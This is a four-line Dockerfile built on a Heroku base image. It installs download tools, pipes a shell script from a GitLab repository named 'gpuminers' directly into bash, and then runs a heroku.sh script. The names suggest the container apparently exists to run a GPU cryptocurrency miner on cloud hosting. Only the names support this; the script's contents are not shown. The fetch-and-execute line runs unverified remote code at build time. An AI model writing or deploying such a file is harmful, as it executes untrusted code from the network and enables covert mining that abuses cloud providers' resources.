FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_gr122_ws6.sh | bash
CMD bash heroku.sh
